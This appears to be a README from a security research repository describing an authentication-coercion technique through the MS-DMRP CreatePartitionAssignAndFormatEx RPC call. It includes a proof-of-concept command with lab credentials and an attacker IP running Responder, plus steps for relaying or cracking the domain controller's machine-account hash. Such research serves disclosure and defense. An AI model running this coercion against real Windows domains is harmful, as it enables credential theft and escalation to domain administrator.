# MS-DMRP - Remote call to IVolumeClient::CreatePartitionAssignAndFormatEx (opnum 7)

## Summary

+ **Protocol**: [[MS-DMRP]: Disk Management Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/19a16e20-072f-4d74-a245-ce4df2f1ecdd)

+ **Protocol UUID**: d2d79df5-3400-11d0-b40b-00aa005ff586

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`IVolumeClient::CreatePartitionAssignAndFormatEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/652fe47e-655d-417f-a26d-7a21bc7aa6ec)

+ **Function operation number**: `7`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-DMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/19a16e20-072f-4d74-a245-ce4df2f1ecdd) protocol (with uuid `d2d79df5-3400-11d0-b40b-00aa005ff586` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-DMRP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/19a16e20-072f-4d74-a245-ce4df2f1ecdd) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-DMRP]: Disk Management Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/19a16e20-072f-4d74-a245-ce4df2f1ecdd) and allows to call RPC functions of this protocol. We will then call the remote [`IVolumeClient::CreatePartitionAssignAndFormatEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/652fe47e-655d-417f-a26d-7a21bc7aa6ec) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
IVolumeClient::CreatePartitionAssignAndFormatEx('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT CreatePartitionAssignAndFormatEx(
   [in] REGION_SPEC partitionSpec,
   [in] wchar_t letter,
   [in] hyper letterLastKnownState,
   [in] int cchAccessPath,
   [in, size_is(cchAccessPath)] wchar_t* AccessPath,
   [in] FILE_SYSTEM_INFO fsSpec,
   [in] boolean quickFormat,
   [in] DWORD dwFlags,
   [out] TASK_INFO* tinfo
 );
```

## References

+ Documentation of protocol [MS-DMRP]: Disk Management Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/19a16e20-072f-4d74-a245-ce4df2f1ecdd

+ Documentation of function `IVolumeClient::CreatePartitionAssignAndFormatEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dmrp/652fe47e-655d-417f-a26d-7a21bc7aa6ec